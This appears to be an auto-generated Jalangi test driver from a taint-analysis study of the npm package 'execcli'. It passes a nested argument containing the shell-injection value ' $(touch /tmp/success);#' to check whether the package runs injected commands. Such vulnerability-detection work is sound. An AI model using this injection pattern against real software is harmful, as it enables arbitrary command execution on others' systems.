// JALANGI DRIVER
process.backup_exit = process.exit;
process.exit = function(){console.log("Tried calling process.exit")};
    
var PUT = require('/nodetaint/packageData/execcli/node_modules/execcli');
try {
	var x0 = {"2":{"_val":{"1":{"_val":{"2":{"2":" $(touch /tmp/success);#"}}}}}};
var x1 = "~/";
var x2 = new Date('1995-12-17T03:24:00.000Z');
PUT["execcli"](x0,x1,x2)();
} catch (e) {
	console.log(e);
}